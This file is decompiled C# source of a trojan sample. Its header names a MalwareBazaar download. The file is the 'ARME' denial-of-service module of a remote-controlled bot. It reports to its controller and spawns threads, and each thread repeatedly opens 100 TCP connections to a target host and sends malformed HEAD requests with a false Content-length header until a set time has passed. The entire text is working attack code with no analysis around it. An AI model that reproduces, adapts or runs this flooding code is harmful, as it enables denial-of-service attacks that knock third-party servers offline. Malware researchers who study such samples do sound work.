// Decompiled with JetBrains decompiler
// Type: ARME
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

[StandardModule]
public sealed class ARME
{
  private static object ThreadsEnded = (object) 0;
  private static string PostDATA;
  private static string HostToAttack;
  private static int TimetoAttack;
  private static int ThreadstoUse;
  private static Thread[] Threads;
  private static bool AttackRunning = false;
  private static int Attacks = 0;

  public static void StartARME(string Host, int Threadsto, int Time, string data)
  {
    if (!ARME.AttackRunning)
    {
      ARME.AttackRunning = true;
      ARME.HostToAttack = Host;
      ARME.PostDATA = data;
      ARME.ThreadstoUse = Threadsto;
      ARME.TimetoAttack = Time;
      if (ARME.HostToAttack.Contains("http://"))
        ARME.HostToAttack = ARME.HostToAttack.Replace("http://", string.Empty);
      if (ARME.HostToAttack.Contains("www."))
        ARME.HostToAttack = ARME.HostToAttack.Replace("www.", string.Empty);
      if (ARME.HostToAttack.Contains("/"))
        ARME.HostToAttack = ARME.HostToAttack.Replace("/", string.Empty);
      ARME.Threads = new Thread[checked (Threadsto - 1 + 1)];
      Core.Send("MSG" + Core.Y + "ARME Attack on " + ARME.HostToAttack + " started!");
      int num = checked (Threadsto - 1);
      int index = 0;
      while (index <= num)
      {
        ARME.Threads[index] = new Thread(new ThreadStart(ARME.DoWork));
        ARME.Threads[index].IsBackground = true;
        ARME.Threads[index].Start();
        checked { ++index; }
      }
    }
    else
      Core.Send("MSG" + Core.Y + "ARME Attack is Already Running on " + ARME.HostToAttack ?? "");
  }

  private static void lol()
  {
    ARME.ThreadsEnded = Operators.AddObject(ARME.ThreadsEnded, (object) 1);
    if (!Operators.ConditionalCompareObjectEqual(ARME.ThreadsEnded, (object) ARME.ThreadstoUse, false))
      return;
    ARME.ThreadsEnded = (object) 0;
    ARME.ThreadstoUse = 0;
    ARME.AttackRunning = false;
    Core.Send("MSG" + Core.Y + "ARME Attack on " + ARME.HostToAttack + " finished successfully");
    ARME.Attacks = 0;
  }

  public static void StopARME()
  {
    if (ARME.AttackRunning)
    {
      int num = checked (ARME.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          ARME.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      ARME.AttackRunning = false;
      Core.Send("MSG" + Core.Y + "ARME Attack on " + ARME.HostToAttack + " stopped successfully");
      ARME.Attacks = 0;
    }
    else
      Core.Send("MSG" + Core.Y + "No ARME Attack is running!");
  }

  private static void DoWork()
  {
    try
    {
      Socket[] socketArray = new Socket[100];
      TimeSpan timeSpan = TimeSpan.FromSeconds((double) ARME.TimetoAttack);
      Stopwatch stopwatch = Stopwatch.StartNew();
      while (stopwatch.Elapsed < timeSpan)
      {
        try
        {
          WebClient webClient = new WebClient();
          int index1 = 0;
          do
          {
            socketArray[index1] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socketArray[index1].Connect(Dns.GetHostAddresses(ARME.HostToAttack), 80);
            socketArray[index1].Send(Encoding.Default.GetBytes("HEAD / HTTP/1.1\r\nHost: " + ARME.HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"));
            checked { ++ARME.Attacks; }
            checked { ++index1; }
          }
          while (index1 <= 99);
          int index2 = 0;
          do
          {
            socketArray[index2].Close();
            checked { ++index2; }
          }
          while (index2 <= 99);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    ARME.lol();
  }
}
